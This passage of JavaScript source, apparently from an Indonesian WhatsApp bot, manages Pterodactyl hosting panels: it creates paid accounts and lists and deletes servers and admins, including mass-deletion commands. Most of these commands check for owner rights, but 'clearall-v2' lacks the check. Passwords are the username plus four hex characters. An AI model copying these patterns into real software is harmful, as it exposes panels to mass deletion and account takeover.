{ buttonId: `.delpanel-v2`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Server`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
break

//================================================================================

case "deladmin-v2": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Hapus Panel Server 2`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domainV2 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break
//------(Batas Case)------//
case 'deladminall-v2': {
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return Reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .deladminall-v2 , 48, 49, 50');
    }

    try {
        // Mengambil data user dari server 2
        let f = await fetch(global.domainV2 + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikeyV2
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return Reply('Tidak ada user yang ditemukan di server 2.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati
            if (excludeIds.includes(u.id.toString())) {
                Reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})\n`);
                continue;
            }

            // Menghapus user dari server 2
            let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikeyV2
                }
            });

            if (deleteUser.ok) {
                Reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n `);
            } else {
                let errorText = await deleteUser.text();
                Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        Reply('Semua user, kecuali yang dikecualikan, berhasil dihapus di server 2!');
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}
//================================================================================

case "delpanel-v2": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domainV2 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV2
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-v2 ${s.id}`
})
}

return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Delete Panel Server 2`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
let f = await fetch(domainV2 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domainV2 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domainV2 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domainV2 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Reply("Server panel tidak ditemukan!")
Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
//------(Batas Case)------//
case 'delpanelall-v2': {
if (!isCreator) return Reply(mess.owner)
    const argsString = body.trim();
    const excludedIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludedIds.length === 0) {
        return Reply('Tolong masukkan ID server yang ingin dikecualikan setelah tanda koma.\nContoh: .delpanelall-v2 , 201, 202, 203');
    }

    try {
        // Mendapatkan daftar server dari server 2
        let f = await fetch(global.domainV2 + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + global.apikeyV2,
            }
        });

        let res = await f.json();
        let servers = res.data;

        if (!servers || servers.length === 0) {
            return Reply('Tidak ada server yang ditemukan di server 2.');
        }

        for (let server of servers) {
            let s = server.attributes;

            // Jika server ID ada di daftar pengecualian, lewati
            if (excludedIds.includes(s.id.toString())) {
                Reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
                continue;
            }

            // Menghapus server
            let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + global.apikeyV2,
                }
            });

            if (deleteServer.ok) {
                Reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
            } else {
                let errorText = await deleteServer.text();
                Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
            }
        }

        Reply('*Semua server berhasil dihapus dari server 2 kecuali yang dikecualikan!*');
    } catch (error) {
        return Reply('Terjadi kesalahan di server 2: ' + error.message);
    }
    break;
}

//================================================================================

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unlimited": case "unli": {
if (!isCreator && !isSeller) return Reply(mess.seller)
if (!text) return Reply(example("username"))
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@gmail.com"
let name = capital(username) + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return Reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await Reply("*Succesfully Create Server Panel*\nData akun sudah dikirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Succes Create Akun Panel*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domain}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await TamaMods.sendMessage(orang, {text: teks}, {quoted: pantek})
delete global.panel
}
break

//================================================================================

case "listadmin": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
var teks = " *List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await TamaMods.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Adp`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
break

//================================================================================

case "listpanel": case "listserver": {
if (!isCreator && !isPremium) return Reply(mess.owner)
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
let messageText = "\n  *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}

await TamaMods.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
  ],
  footer: `${botname}\nAuto Cek Server Panel`,
  headerType: 1,
  viewOnce: true,
  text: messageText,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
break

//================================================================================

case "deladmin": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return Reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Hapus Adp`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(domain + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return Reply("Akun admin panel tidak ditemukan!")
await Reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel": {
if (!isCreator && !isPremium) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return Reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel ${s.id}`
})
}

return TamaMods.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}\nAuto Delete Panel`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: pantek})
}
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return Reply("Server panel tidak ditemukan!")
Reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break
//------(Batas Case)------//
case 'deladminall': {
if (!isCreator) return Reply(mess.owner)
    const argsString = body.trim();
    const excludeIds = argsString.split(',').slice(1).map(id => id.trim()); // Ambil semua ID setelah koma

    if (excludeIds.length === 0) {
        return Reply('Tolong masukkan ID user yang ingin dikecualikan setelah tanda koma.\nContoh: .deladminall , 48, 49, 50');
    }

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey,
            }
        });

        let res = await f.json();
        let users = res.data;

        if (!users || users.length === 0) {
            return Reply('Tidak ada user yang ditemukan.');
        }

        for (let user of users) {
            let u = user.attributes;

            // Jika ID user ada di daftar pengecualian, lewati proses penghapusan
            if (excludeIds.includes(u.id.toString())) {
                Reply(`Mengabaikan user dengan ID: ${u.id} (${u.username})`);
                continue;
            }

            let deleteUser = await fetch(domain + "/api/application/users/" + u.id, {
                method: "DELETE",
                headers: {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });

            if (deleteUser.ok) {
                Reply(`Berhasil menghapus user dengan ID: ${u.id} (${u.username})\n`);
            } else {
                let errorText = await deleteUser.text();
                Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
            }
        }

        Reply('Semua user, kecuali yang dikecualikan, berhasil dihapus!');
    } catch (error) {
        return Reply('Terjadi kesalahan: ' + error.message);
    }
    break;
}

//================================================================================

case 'deluserall-v2': {
if (!isCreator) return Reply(mess.owner)
 
 try {
 // Mengambil daftar user dari server 2
 let f = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return Reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 Reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 Reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 Reply('*Semua user kecuali admin berhasil dihapus dari server 2!*');
 } catch (error) {
 return Reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'deluserall': {
if (!isCreator) return Reply(mess.owner)
 
 try {
 // Mengambil daftar user dari server 1
 let f = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let res = await f.json();
 let users = res.data;

 if (!users || users.length === 0) {
 return Reply('Tidak ada user yang ditemukan di server 2.');
 }

 // Loop melalui setiap user
 for (let user of users) {
 let u = user.attributes;

 // Hanya hapus user yang bukan admin (root_admin = false)
 if (!u.root_admin) {
 let deleteUser = await fetch(global.domain + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 // Cek status penghapusan user
 if (deleteUser.ok) {
 Reply(`*Berhasil menghapus user dengan ID: ${u.id}* dari server 2`);
 } else {
 let errorText = await deleteUser.text();
 Reply(`Gagal menghapus user dengan ID: ${u.id} dari server 2. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 }

 Reply('*Semua user kecuali admin berhasil dihapus dari server 1!*');
 } catch (error) {
 return Reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearall-v2': {
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return Reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall-v2 ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domainV2 + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 Reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 if (excludedServerIds.includes(s.id.toString())) {
 Reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteServer = await fetch(global.domainV2 + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteServer.ok) {
 Reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 Reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domainV2 + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 Reply('Tidak ada user yang ditemukan.');
 } else {
 for (let user of users) {
 let u = user.attributes;

 if (excludedAdminIds.includes(u.id.toString())) {
 Reply(`*Admin dengan ID ${u.id} (${u.username}) dikecualikan dari penghapusan.*`);
 continue;
 }

 let deleteUser = await fetch(global.domainV2 + "/api/application/users/" + u.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikeyV2,
 }
 });

 if (deleteUser.ok) {
 Reply(`*Berhasil menghapus user dengan ID: ${u.id} (${u.username})*`);
 } else {
 let errorText = await deleteUser.text();
 Reply(`Gagal menghapus user dengan ID: ${u.id}. Error: ${deleteUser.status} - ${errorText}`);
 }
 }
 Reply('*Proses penghapusan admin selesai!*');
 }

 } catch (error) {
 Reply('Terjadi kesalahan: ' + error.message);
 }
 break;
}

case 'clearall':
if (!isCreator) return Reply(mess.owner)
{
 const argsString = body.trim();
 const [serverIdsString, adminIdsString] = argsString.split('|').map(part => part.trim()); // Memisahkan ID server dan ID admin
 const excludedServerIds = serverIdsString.split(',').slice(1).map(id => id.trim()); // ID server yang dikecualikan
 const excludedAdminIds = adminIdsString ? adminIdsString.split(',').map(id => id.trim()) : []; // ID admin yang dikecualikan

 if (excludedServerIds.length === 0 && excludedAdminIds.length === 0) {
 return Reply('Tolong masukkan ID server dan/atau ID admin yang ingin dikecualikan.\nContoh: .clearall ,idserver,idserver,idserver|idadmin,idadmin,idadmin');
 }

 try {
 // =======================
 // Proses Hapus Server
 // =======================
 let fServers = await fetch(global.domain + "/api/application/servers", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let serverRes = await fServers.json();
 let servers = serverRes.data;

 if (!servers || servers.length === 0) {
 Reply('Tidak ada server yang ditemukan.');
 } else {
 for (let server of servers) {
 let s = server.attributes;

 // Jika server ID ada di daftar pengecualian, lewati
 if (excludedServerIds.includes(s.id.toString())) {
 Reply(`*Server dengan ID ${s.id} (${s.name}) dikecualikan dari penghapusan.*`);
 continue;
 }

 // Menghapus server
 let deleteServer = await fetch(global.domain + "/api/application/servers/" + s.id, {
 method: "DELETE",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 if (deleteServer.ok) {
 Reply(`*Berhasil menghapus server dengan ID: ${s.id} (${s.name})*`);
 } else {
 let errorText = await deleteServer.text();
 Reply(`Gagal menghapus server dengan ID: ${s.id}. Error: ${deleteServer.status} - ${errorText}`);
 }
 }
 Reply('*Proses penghapusan server selesai!*');
 }

 // =======================
 // Proses Hapus Admin
 // =======================
 let fAdmins = await fetch(global.domain + "/api/application/users", {
 method: "GET",
 headers: {
 "Accept": "application/json",
 "Content-Type": "application/json",
 "Authorization": "Bearer " + global.apikey,
 }
 });

 let adminRes = await fAdmins.json();
 let users = adminRes.data;

 if (!users || users.length === 0) {
 Reply('Tidak ada user yang ditemukan.');
